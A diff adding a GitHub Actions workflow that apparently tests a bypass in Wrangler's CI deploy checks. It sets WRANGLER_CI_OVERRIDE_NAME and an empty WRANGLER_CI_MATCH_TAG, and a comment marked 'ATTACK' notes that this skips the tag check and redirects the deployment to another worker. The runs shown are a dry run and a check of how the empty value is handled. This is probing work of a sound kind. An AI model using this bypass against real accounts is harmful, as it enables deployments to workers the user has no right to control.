@@ -1,0 +1,54 @@
+name: Test WRANGLER_CI_OVERRIDE bypass
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test-ci-override:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          
+      - name: Install dependencies
+        run: npm install
+        
+      - name: Test 1 - OVERRIDE_NAME with empty MATCH_TAG
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: 31ae559d77eca719a4b168aed8ba1c64
+          # ATTACK: Override to deploy to agw-fp-echo instead of cf-builds-runner-probe-v4
+          WRANGLER_CI_OVERRIDE_NAME: agw-fp-echo
+          # Empty string bypasses the tag check (getCIMatchTag() returns undefined for empty)
+          WRANGLER_CI_MATCH_TAG: ""
+          WORKERS_CI: "1"
+        run: |
+          echo "=== Test: WRANGLER_CI_OVERRIDE_NAME=$WRANGLER_CI_OVERRIDE_NAME ==="
+          echo "=== WRANGLER_CI_MATCH_TAG='$WRANGLER_CI_MATCH_TAG' ==="
+          
+          # Check what worker name wrangler resolves
+          echo "--- Dry run (no actual deploy) ---"
+          npx wrangler@latest deploy --dry-run 2>&1 | head -30 || true
+          
+          echo "--- IMPORTANT: If 'agw-fp-echo' appears in output, override works! ---"
+
+      - name: Test 2 - What is MATCH_TAG behavior with empty string?
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: 31ae559d77eca719a4b168aed8ba1c64
+          WRANGLER_CI_MATCH_TAG: ""
+          WORKERS_CI: "1"
+        run: |
+          echo "getCIMatchTag with empty string:"
+          node -e "
+          const tag = process.env['WRANGLER_CI_MATCH_TAG'];
+          console.log('MATCH_TAG value:', JSON.stringify(tag));
+          console.log('Is empty string:', tag === '');
+          console.log('Is undefined:', tag === undefined);
+          console.log('Is falsy:', !tag);
+          console.log('Bypasses check:', !tag ? 'YES (check returns early)' : 'NO');
+          "
